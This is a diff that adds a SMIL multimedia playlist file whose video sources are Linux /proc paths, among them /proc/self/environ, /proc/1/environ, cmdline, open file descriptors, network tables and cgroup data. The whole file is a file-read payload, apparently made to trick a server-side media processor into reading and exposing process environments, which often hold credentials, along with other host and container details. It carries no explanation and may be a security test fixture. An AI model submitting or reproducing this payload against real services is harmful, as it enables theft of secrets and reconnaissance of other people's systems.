@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8"?>
+<smil>
+  <body>
+    <switch>
+      <video src="/proc/1/environ"/>
+      <video src="/proc/self/environ"/>
+      <video src="/proc/1/cmdline"/>
+      <video src="/proc/self/cmdline"/>
+      <video src="/proc/net/tcp"/>
+      <video src="/proc/net/tcp6"/>
+      <video src="/proc/net/dev"/>
+      <video src="/proc/loadavg"/>
+      <video src="/proc/meminfo"/>
+      <video src="/proc/uptime"/>
+      <video src="/proc/version"/>
+      <video src="/proc/stat"/>
+      <video src="/proc/vmstat"/>
+      <video src="/proc/diskstats"/>
+      <video src="/proc/1/status"/>
+      <video src="/proc/self/status"/>
+      <video src="/proc/1/fd/1"/>
+      <video src="/proc/1/fd/2"/>
+      <video src="/proc/self/fd/1"/>
+      <video src="/proc/self/fd/2"/>
+      <video src="/proc/self/attr/current"/>
+      <video src="/proc/1/cgroup"/>
+    </switch>
+  </body>
+</smil>
